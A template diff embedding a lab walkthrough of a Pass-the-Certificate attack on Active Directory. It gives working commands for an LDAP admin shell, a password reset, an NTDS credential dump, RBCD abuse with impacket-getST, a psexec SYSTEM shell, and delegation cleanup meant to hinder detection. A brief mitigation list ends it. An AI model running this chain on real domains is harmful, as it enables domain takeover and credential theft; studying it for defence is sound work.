@@ -1,0 +1,211 @@
+
+{% extends "base.html" %}
+
+{% block content %}
+<div class="container my-5">
+    <h1>{{ tutorial['title'] }}</h1>
+    {% if tutorial['image_path'] %}
+    <img src="{{ url_for('static', filename=tutorial['image_path']) }}" class="img-fluid mb-4" alt="{{ tutorial['title'] }}">
+    {% endif %}
+    <div class="tutorial-content">
+        <h1 class="post-title entry-title">A Detailed Guide on PassTheCert</h1>
+<div class="post-date">&nbsp;</div>
+<div class="content post-excerpt entry-content clearfix">
+<p>Pass-the-Certificate is a highly effective Kerberos privilege escalation method that bypasses traditional password-based authentication. Instead of relying on passwords or hashes, it uses X.509 certificates and private keys to exploit the PKINIT (Public Key Cryptography for Initial Authentication) extension. This allows attackers to obtain a Ticket-Granting Ticket (TGT), granting them unauthorized access to network resources.</p>
+<p>By leveraging the security vulnerabilities in Kerberos authentication, Pass-the-Certificate is a serious threat to organizations relying on this protocol. Understanding how Pass-the-Certificate works and implementing countermeasures is essential for safeguarding Kerberos-based systems against sophisticated attacks.</p>
+<h3>Table of Content</h3>
+<ul>
+<li><strong>Overview the Pass-The-certificate (PtC)</strong></li>
+<li><strong>Prerequisites</strong></li>
+<li><strong>Enumeration &amp; Exploitation</strong></li>
+<li><strong>Mitigation</strong></li>
+</ul>
+<h3>Overview the Pass-The-certificate (PtC)</h3>
+<p>In traditional Active Directory exploitation,&nbsp;<strong>Pass-the-Hash</strong>&nbsp;and&nbsp;<strong>Pass-the-Ticket</strong>&nbsp;attacks are widely known.&nbsp;<strong>Pass-the-Certificate</strong>&nbsp;is a more modern and stealthy technique that leverages&nbsp;<strong>X.509 certificates</strong>&nbsp;instead of NTLM hashes or Kerberos tickets to authenticate and escalate privileges across an AD environment.</p>
+<h4>What is Pass-the-Certificate?</h4>
+<p>Pass-the-Certificate (PtC) is a post-exploitation technique where an attacker uses a&nbsp;<strong>certificate and its corresponding private key</strong>&nbsp;to authenticate to Active Directory services, all&nbsp;<strong>without knowing or needing the user&rsquo;s password</strong>. It is possible due to:</p>
+<ul>
+<li><strong>PKINIT (Public Key Cryptography for Initial Authentication in Kerberos)</strong>&nbsp;&ndash; allows Kerberos to use certificates instead of passwords.</li>
+<li><strong>Schannel (Secure Channel)</strong>&nbsp;&ndash; permits certificate-based authentication over LDAP, SMB, and other services.</li>
+</ul>
+<p>If an attacker can extract or generate a certificate associated with a privileged user (like Administrator), they can&nbsp;<strong>impersonate that user indefinitely</strong>&nbsp;as long as the cert is valid.</p>
+<h4>Why Is This Dangerous?</h4>
+<ul>
+<li><strong>Bypasses Password Policies</strong>&nbsp;&ndash; MFA, lockout thresholds, and password changes don&rsquo;t help.</li>
+<li><strong>Long-Lived Access</strong>&nbsp;&ndash; Certs typically have longer validity (months to years).</li>
+<li><strong>Stealthy</strong>&nbsp;&ndash; May not trigger alerts if PKINIT and Schannel usage aren&rsquo;t monitored.</li>
+<li><strong>RBCD Abuse</strong>&nbsp;&ndash; In combination with Resource-Based Constrained Delegation (RBCD), it can lead to full domain compromise.</li>
+</ul>
+<h3>Prerequisite</h3>
+<ul>
+<li>Windows Server 2019 as Active Directory that supports PKINIT</li>
+<li>Domain must have Active Directory Certificate Services and Certificate Authority configured.</li>
+<li>Kali Linux packed with tools</li>
+<li>Tools: Certipy, passthecert.py (Python version), nxc smb, impacket-getST, impacket-psexec.</li>
+</ul>
+<p>In this walkthrough, we assume: A privileged certificate (administrator.pfx) is already available (e.g., obtained in previous AD CS attack chains).</p>
+<h3>Enumeration &amp; Exploitation</h3>
+<p>We&rsquo;ll start with a valid .pfx file for a high-privileged user (Administrator), extract the certificate and private key, then use tools like passthecert.py, impacket-getST, and psexec to pivot, elevate, and ultimately achieve full domain dominance.</p>
+<h4>Extract Certificate and Private Key</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">certipy-ad cert -pfx administrator.</span><span class="enlighter-m3">pfx</span><span class="enlighter-text"> -nokey -out admin.</span><span class="enlighter-m3">crt</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">certipy-ad cert -pfx administrator.</span><span class="enlighter-m3">pfx</span><span class="enlighter-text"> -nocert -out admin.</span><span class="enlighter-m3">key</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>We separate the PFX into a certificate (admin.crt) and private key (admin.key) for passthecert.py, as the private key is essential for authentication. This ensures compatibility with TLS or LDAP-based authentication systems.</p>
+<p><strong><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhvdr7f5waNJXl3_vYL6_oaWGuhT2-O66oiY0_Omqo1Gb0etPCoY5qo_w3HoiXQPadDh1YdBVZSXVRD18wDlhkzuFyvxwGQxwTsqqDlGBKHeWqXViqSRu8oxs3dSX_020BBF5HGU-JvljCleiKwvAH6e99hogfHdjhoxRzvLenAn2AyS0eTedDiPDWx_zi/s16000/1.png" alt="" /></strong></p>
+<h4>Launch an LDAP Shell as Administrator</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action ldap-shell -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>After separating the PFX into a certificate and private key, this method uses those to establish an interactive LDAP shell authenticated as Administrator via TLS Schannel, bypassing Kerberos. It&rsquo;s useful when PKINIT fails, allowing direct administrative control via LDAP.</p>
+<p><img class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhy9xJvsJolUSUOGEEPulY-sPate5uqXRh1YbZIRjfxJe7hgJrZrBNSiT2ldcej8nG2m5nEfugzGsTEvRUdhsWJbU01uw210KpRop6lXVo41_iVQBQbe6YL-mQBwaGVETq1VTl1-MCa1itnJeUnHl_NZhZwZjYnHW7UeD8bqLHfgbBZbwjQC_XJ5DRF2MIz/s16000/2.png" alt="PassTheCert Attack " width="1466" height="251" /></p>
+<h4>Reset a User&rsquo;s Password via Certificate</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action modify_user -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -target sanjeet -</span><span class="enlighter-k1">new</span><span class="enlighter-text">-pass Password@</span><span class="enlighter-n1">3</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This step modifies the target user (sanjeet) to set a new password (Password@3), impersonating Administrator. It allows us to pivot by gaining control over another account&rsquo;s credentials.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgizuT1PSO4f2QC86IlYvT2Oa5TDjPlQvU5I5XSaU98k_TBR2vVWQmhQVgn7GVgk4mjT4ACMj6ydrZ4uofZIWAjji5NsZGAbDmPaO1aD9osLjkeZiOOCthGes0wFePYVenmfbbib3vtJ8aPxSufDD2CKOcUuQF_aebxXT6PPlplKsX8nxY_9ovMj9n3sLKH/s16000/3.png" alt="" /></p>
+<h4>Elevate raj via Cert-Auth</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action modify_user -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -target raj -elevate</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>The command used to elevate the privileges of&nbsp;<strong>raj</strong>&nbsp;by modifying their account, using the certificate (admin.crt) and private key (admin.key) for authentication.</p>
+<p><img class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrm_ggBF2I6DjHcT83zYGffaiOE2aJzhMGT1CVtq6-F6YFj-ylEO2Jb4a-SgsFTFU9IjzJd4C7pmBm7N74eiUB7QXog1SPn3VP2pB4Vwwn0mGDyc6zzrMSVxRQvaNUl14Q28Zf1D-kY27qzdophszsnA-DBzYgGIYJz5xriH1GgYZEIIr6CMI2i3Ockyvg/s16000/5.png" alt="PassTheCert Attack " width="1175" height="167" /></p>
+<h4>Validate Elevated Privilege Access</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">nxc smb </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -u raj -p </span><span class="enlighter-s0">'Password@1'</span><span class="enlighter-text"> &ndash;ntds</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This step attempts the NTDS dump again using&nbsp;<strong>raj</strong>, now with upgraded privileges. It highlights that the certificate-based elevation effectively provided real-world control, enabling us to execute the dump with escalated permissions.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhy2SPdY2FHGxMmoZebLKj4772dPtjk3HLoK5F3fs66hCNLBAGA3VI1B0ZYZ-UkcHBM3MvdfiJmOTI8QANn9qpCSfKCiLLfVI4PrW5idk8ahY3AeB8Q9b7jaTt6On7kzpoXOQhY5uPjwcpz9ODa9zIdyBJKQ7bHJjnfFE78TWoWwqBMtLKI2cJ1jWp6GIPK/s16000/6.png" alt="" /></p>
+<h4>Add a New Computer Account (HULK)</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action add_computer -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -computer-name HULK -computer-pass Password@</span><span class="enlighter-n1">2</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This step creates a computer object&nbsp;<strong>HULK$</strong>&nbsp;in the domain, setting up a machine account for&nbsp;<a href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/"><strong>Resource-Based Constrained Delegation (RBCD)</strong></a>&nbsp;chaining. This establishes the foundation for further escalation through RBCD, which will be configured in the next step from&nbsp;<strong>HULK</strong>&nbsp;to&nbsp;<strong>DC01$</strong>, enabling us to delegate privileges and move laterally across the network.</p>
+<p><img class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtyteK6HnyTZfwSg_N8rx6NPkfkcwrOjGjpblFMvUaKSykXVzpRBjl9tdIrmMooZPNZnmiT40OtBqUy9O0hgj9uSi-a5G3JU6glqFhD4bKplft4t0EJf4ol4FV54TmZycf2PFNRTJh-q4ev3SivmHolnPxbUx1LJ2pW1RHXTJxvxgEM3Ng6mDkuL9nIxX3/s16000/7.png" alt="PassTheCert Attack " width="1193" height="159" /></p>
+<h4>Configure RBCD (Delegation) from HULK to DC01$</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action write_rbcd -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -delegate-to DC01$ -delegate-from HULK$</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This step adds&nbsp;<strong>ACES</strong>&nbsp;in&nbsp;<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>, granting&nbsp;<strong>HULK$</strong>&nbsp;the ability to impersonate&nbsp;<strong>DC01$</strong>. This action enables us to perform actions on behalf of the DC01 machine, leveraging the RBCD configuration to escalate privileges and gain further access within the domain.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhth_PHrHxwJAB2k_JfvdFmLOlyhJIQzx4BG8Dc1H7Y2grSb0HAWdaLe-p6RLAs3wCTRUSiTdubu56ZyuEnfNCfFKdUlt8Z0heRr3kNP39vikiC9kTqqwrZNDCx5p0qOXEXLMKNEMd1fuYmz2aIEDF6JuZrMcGIppC24LOYdRLD-UKa_WsrG1GNfEvp0qxK/s16000/8.png" alt="" /></p>
+<h4>Impersonate via kerberos using GetST</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">impacket-getST ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text">/</span><span class="enlighter-s0">'HULK$'</span><span class="enlighter-text">:Password@</span><span class="enlighter-n1">3</span><span class="enlighter-text"> -spn cifs/DC01.</span><span class="enlighter-m3">ignite</span><span class="enlighter-text">.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -impersonate administrator -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This step requests a&nbsp;<strong>CIFS Service Ticket (TGS)</strong>&nbsp;for&nbsp;<strong>DC01$</strong>, impersonating&nbsp;<strong>Administrator</strong>. By using the RBCD chain (HULK$ &rarr; DC01$), it instructs Active Directory to issue a fully delegated Kerberos ticket for Administrator access, setting up the next step to execute&nbsp;<strong>psexec</strong>&nbsp;with elevated privileges.</p>
+<p><img class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqA77Em334TwUjUl1fG_pluqTDpJaU_Pff9qGV5cbVItallk0dAE3K4NGGxbNxHCOX9ZDvEzzhbYlkHtILZoWQvAume0w3JTRKyotF8B8Xg-HN5tMEToW4eDjqCC2JHfVFUUitYTALEJxXkhGDAb2zvR_9Eu1IEU7o9g6LM_Uok07ew4QuLOE8tRuFdcJ4/s16000/9.png" alt="PassTheCert Attack " width="1106" height="276" /></p>
+<h4>Load Ticket and Achieve SYSTEM Shell</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">KRB5CCNAME=administrator@cifs_DC01.</span><span class="enlighter-m3">ignite</span><span class="enlighter-text">.</span><span class="enlighter-m3">local</span><span class="enlighter-text">@IGNITE.</span><span class="enlighter-m3">LOCAL</span><span class="enlighter-text">.</span><span class="enlighter-m3">ccache</span></div>
+</div>
+<div class="">
+<div><span class="enlighter-text">impacket-psexec ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text">/administrator@Dc01.</span><span class="enlighter-m3">ignite</span><span class="enlighter-text">.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -k -no-pass -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This step loads the cached Service Ticket (TGS) into the Kerberos cache. Then, using PsExec, we authenticate as Administrator without a password. By leveraging the TGS from impacket-getST, we impersonate Administrator, thus completing the escalation chain that began with admin.crt and admin.key along with RBCD.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1ImtVYsaM3NjtnVIN_Eoga-1FX7iUKtJDpi99UDmps0PhMbNxhkpaYa2iGzkoe8YnFXHCHGXGRXdpKq19sIZSC-YXyZVUw-ro_wgsm_4KiROIjUAisd_C_jO4RuLC8GGkrIPsRV7HZWTT31qUEyvmdnR0q0uqfS_0EC_h294c6YUbv9B1a0YGW_ZYKtY5/s16000/10.png" alt="" /></p>
+<h4>Read RBCD Entries (Verify Delegation Config)</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action read_rbcd -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -delegate-to DC01$</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This checks the&nbsp;<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>&nbsp;attribute on&nbsp;<strong>DC01$</strong>, confirming active RBCD configuration and identifying accounts (e.g.,&nbsp;<strong>HULK$</strong>) that can impersonate users like&nbsp;<strong>Administrator</strong>&nbsp;before performing cleanup or persistence actions.</p>
+<p><img class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVoUPvxSknK4exdBY6h7ZMd-lKM-xXI0CCnJRlpvfraxsU7e8RCbcMiyZ_HTwiVltNQBWHnxlwXB9ZQagIFib8PfI5mzT6NEe0U36FQVarTqHM7LqVkw8WdzdFFCFa77Y2oLQ4el1XA8nvuv7Zu0o7IBve25UCI8wYtIlTGMO09yyXKiyINThfNyd-U7nw/s16000/11.png" alt="PassTheCert Attack " width="1154" height="178" /></p>
+<h4>Flush RBCD Delegation for a Target Object</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action flush_rbcd -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -delegate-to raj</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This command removes the RBCD configuration for&nbsp;<strong>raj</strong>, clearing the delegation ACL to erase traces of impersonation and hinder detection by blue teams.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdWAFKeFlDJmgpMRTE3VsENA7gJEjdt5L6rPXmLye5MZBY5rnjVvbfEs-NM50SVE6yFwj0sEJ-yG4l3gZ4zOStKqf8qkHrIDJa9qdvwXGvImPmeo17jUoTGdGiXlpXX2K-g98wxZdK2fC18Z9lH3_EM2PNOKtWNB5Z4Vqy59XYOpBhRpgsT85t-ViEY7D9/s16000/12.png" alt="" /></p>
+<h4>Re-Verify RBCD Was Flushed</h4>
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers ">
+<div class="enlighter-code">
+<div class="enlighter">
+<div class="">
+<div><span class="enlighter-text">python3 passthecert.</span><span class="enlighter-m3">py</span><span class="enlighter-text"> -action read_rbcd -crt admin.</span><span class="enlighter-m3">crt</span><span class="enlighter-text"> -key admin.</span><span class="enlighter-m3">key</span><span class="enlighter-text"> -domain ignite.</span><span class="enlighter-m3">local</span><span class="enlighter-text"> -dc-ip </span><span class="enlighter-n0">192.168</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -delegate-to DC01$</span></div>
+</div>
+</div>
+</div>
+</div>
+<p>This re-runs the first query to verify the delegation rights are removed, and if no entries are found, it confirms that&nbsp;<strong>flush_rbcd</strong>&nbsp;succeeded, ensuring proper verification for both red and blue teams.</p>
+<p><strong><img class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEir8cRARoYsVGdaZycoTRW2hAblAre8Q_w0gYESE_HkIBDUlLsnPRib-yi7rYEnH-47kO5oo8WobQLBQhkbbY3V-ciTh1Tzck04vqCzJjpDcB-XhtxZEQqJkeADPtvcXfqEAddXjaZhVdRmWP7W_plTTshnN2xVBKRg8pRI9MWQhGwEOsdagwSnM0rzOvM0/s16000/13.png" alt="PassTheCert Attack " width="1162" height="165" /></strong></p>
+<h3>Mitigation</h3>
+<ul>
+<li>Limit certificate issuance to trusted roles only</li>
+<li>Monitor for unusual certificate usage and Schannel binds</li>
+<li>Detect unexpected&nbsp;<strong>User &gt; Computer delegation entries</strong>&nbsp;(msDS-AllowedToActOnBehalfOfOtherIdentity)</li>
+<li>Audit password modifications via certificate-auth shell</li>
+<li>Disable unmanaged or unused RBCD ACLs</li>
+</ul>
+</div>
+    </div>
+    <a href="{{ url_for('index') }}" class="btn btn-secondary mt-4">Back to Tutorials</a>
+</div>
+{% endblock %}
